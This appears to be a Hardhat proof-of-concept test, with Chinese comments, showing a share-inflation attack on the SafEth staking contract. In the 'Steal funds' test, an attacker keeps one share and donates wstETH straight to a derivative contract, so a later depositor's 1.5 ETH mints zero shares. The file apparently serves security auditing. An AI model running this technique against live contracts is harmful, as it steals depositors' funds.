import { SafEth } from "../typechain-types";
import { ethers, upgrades, network } from "hardhat";
import { expect } from "chai";
import {
  getAdminAccount,
  getUserAccounts,
  getUserBalances,
  randomStakes,
  randomUnstakes,
} from "./helpers/integrationHelpers";
import { getLatestContract } from "./helpers/upgradeHelpers";
import { BigNumber } from "ethers";
import ERC20 from "@openzeppelin/contracts/build/contracts/ERC20.json";
import { RETH_MAX, WSTETH_ADRESS, WSTETH_WHALE } from "./helpers/constants";
describe.only("SafEth POC", function () {
  let safEthContractAddress: string;
  let strategyContractAddress: string;
  // create string array
  let derivativesAddress: string[] = [];
  let startingBalances: BigNumber[];
  let networkFeesPerAccount: BigNumber[];
  let totalStakedPerAccount: BigNumber[];
  before(async () => {
    startingBalances = await getUserBalances();
    // 在 networkFeesPerAccount 变量中创建一个与 startingBalances 数组相同长度的新数组，其中的每个元素都被初始化为大整数 0。
    networkFeesPerAccount = startingBalances.map(() => BigNumber.from(0));
    totalStakedPerAccount = startingBalances.map(() => BigNumber.from(0));
  });
  it("Should deploy the strategy contract", async function () {
    const safEthFactory = await ethers.getContractFactory("SafEth");
    const strategy = (await upgrades.deployProxy(safEthFactory, [
      "Asymmetry Finance ETH",
      "safETH",
    ])) as SafEth;
    await strategy.deployed();
    strategyContractAddress = strategy.address;
    const owner = await strategy.owner();
    const derivativeCount = await strategy.derivativeCount();
    // 第一行验证了策略合约的所有者地址是否与预期的相同，第二行验证了衍生品数量是否为零。
    expect(owner).eq((await getAdminAccount()).address);
    expect(derivativeCount).eq("0");
  });
  /** 部署衍生品合约，并都按照相同权重添加到策略合约中， */
  it("Should deploy derivative contracts and add them to the strategy contract with equal weights", async function () {
    const supportedDerivatives = ["Reth", "SfrxEth", "WstEth"];
    const strategy = await getLatestContract(strategyContractAddress, "SafEth");
    for (let i = 0; i < supportedDerivatives.length; i++) {
      const derivativeFactory = await ethers.getContractFactory(
        // 根据当前衍生品名称获取了相应的合约工厂。
        supportedDerivatives[i]
      );
      const derivative = await upgrades.deployProxy(derivativeFactory, [
        strategyContractAddress,
      ]);
      
      const derivativeAddress = derivative.address;
      derivativesAddress.push(derivativeAddress);
      await derivative.deployed();
      // 调用策略合约中的 addDerivative 函数，将新部署的衍生品合约地址添加到策略中，并传递了一个权重值。
      const tx1 = await strategy.addDerivative(
        derivative.address,
        "1000000000000000000"
      );
      await tx1.wait();
    }
    const derivativeCount = await strategy.derivativeCount();
    expect(derivativeCount).eq(supportedDerivatives.length);
  });
  it("Steal funds", async function () {
    const strategy = await getLatestContract(strategyContractAddress, "SafEth");
    // 获取了一组用户账户信息
    const userAccounts = await getUserAccounts();
    // 所有用户的总质押金额，初始值为零
    let totalStaked = BigNumber.from(0);
    // 创建了两个与策略合约连接的用户签名者（signer）
    const userStrategySigner = strategy.connect(userAccounts[0]);
    const userStrategySigner2 = strategy.connect(userAccounts[1]);
    // 用户要质押的以太币数量， 将其转换成以太币的最小单位（wei）并存储在 depositAmount
    const ethAmount = "100"; 
    const depositAmount = ethers.utils.parseEther(ethAmount);
    // 将用户质押的金额加到 totalStaked 中，以更新总质押金额。
    totalStaked = totalStaked.add(depositAmount);
    
    // 获取了用户账户的余额
    const balanceBefore = await userAccounts[0].getBalance();
    // 质押
    const stakeResult = await userStrategySigner.stake({
      value: depositAmount,
    });
    // 等待质押交易被挖矿确认
    const mined = await stakeResult.wait();
    const networkFee = mined.gasUsed.mul(mined.effectiveGasPrice);
    // 更新了网络费用和总质押金额的记录。
    networkFeesPerAccount[0] = networkFeesPerAccount[0].add(networkFee);
    totalStakedPerAccount[0] = totalStakedPerAccount[0].add(depositAmount);
    // 获取了用户在策略合约中的 sfToken 余额。
    const userSfEthBalance = await strategy.balanceOf(userAccounts[0].address);
    // 假设用户要取回除 (所有余额 - 1) 个 sfToken
    const userSfWithdraw = userSfEthBalance.sub(1);
   
    // 模拟了一个账户，这里可能用于模拟攻击者账户
    await network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [WSTETH_WHALE],
    });
    // 获取了模拟的攻击者账户的签名者
    const whaleSigner = await ethers.getSigner(WSTETH_WHALE);
    // 创建了一个与 ERC20 合约（可能是 Wrapped Staked Ether）交互的实例
    const erc20 = new ethers.Contract(WSTETH_ADRESS, ERC20.abi, userAccounts[0]);
    // 获取了一个衍生品的地址
    const wderivative = derivativesAddress[2];
    // 获取了衍生品合约中 ERC20 代币的余额
    const erc20BalanceBefore = await erc20.balanceOf(wderivative);
    //remove all but 1 sfToken
    // 用户调用 unstake 函数来取回(所有余额 - 1) 个 sfToken。
    const unstakeResult = await userStrategySigner.unstake(userSfWithdraw);
    // 将 ERC20 合约连接到攻击者的账户
    const erc20Whale = erc20.connect(whaleSigner);
    // 定义了一个名为 erc20Amount 的字符串，表示攻击者要转移的 ERC20 代币数量。
    const erc20Amount = ethers.utils.parseEther("10");
    // transfer tokens directly to the derivative (done by attacker)
    // 攻击者将 ERC20 代币直接转移到了衍生品合约中。
    await erc20Whale.transfer(wderivative, erc20Amount);
    // NEW USER ENTERS
    // 第二个用户要质押的以太币数量
    const ethAmount2 = "1.5"; 
    const depositAmount2 = ethers.utils.parseEther(ethAmount2);
      
    const stakeResu2lt = await userStrategySigner2.stake({
      value: depositAmount2,
    });
    const mined2 = await stakeResult.wait();
     
    // User has 0 sfTokens!
    const userSfEthBalance2 = await strategy.balanceOf(userAccounts[1].address);
    console.log("userSfEthBalance2: ", userSfEthBalance2.toString());
    // Attacker has 1 sfToken
    // 获取了攻击者在策略合约中的 sfToken 余额
    const AttakcerSfEthBalanc = await strategy.balanceOf(userAccounts[0].address);
    console.log("AttakcerSfEthBalanc: ", AttakcerSfEthBalanc.toString());
    
    //Total supply is 1. 
    const totalSupply = await strategy.totalSupply();
    console.log("totalSupply: ", totalSupply.toString());
    
    
  });
});